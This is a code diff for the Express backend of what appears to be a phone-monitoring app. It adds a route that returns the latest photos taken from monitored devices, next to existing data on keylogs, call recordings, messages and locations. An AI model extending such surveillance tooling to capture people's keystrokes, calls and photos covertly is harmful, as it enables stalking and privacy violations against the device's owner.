@@ -13,6 +13,7 @@ const KeywordAlert = require('../models/KeywordAlert');
 const Geofence = require('../models/Geofence');
 const AppUsage = require('../models/AppUsage');
 const CallRecording = require('../models/CallRecording');
+const Photo = require('../models/Photo');          // ✅ NEW
 
 const getDeviceIds = async (userId) => {
   const devices = await Device.find({ userId });
@@ -176,6 +177,19 @@ router.get('/recent', protect, async (req, res) => {
     let all = [...calls, ...messages, ...locations, ...keylogs];
     all.sort((a,b) => new Date(b.timestamp) - new Date(a.timestamp));
     res.json({ success: true, data: all.slice(0, 30) });
+  } catch (error) {
+    res.status(500).json({ success: false, message: error.message });
+  }
+});
+
+// ✅ NEW: Get latest photos
+router.get('/photos', protect, async (req, res) => {
+  try {
+    const deviceIds = await getDeviceIds(req.user._id);
+    const photos = await Photo.find({ deviceId: { $in: deviceIds } })
+      .sort({ timestamp: -1 })
+      .limit(50);
+    res.json({ success: true, data: photos });
   } catch (error) {
     res.status(500).json({ success: false, message: error.message });
   }
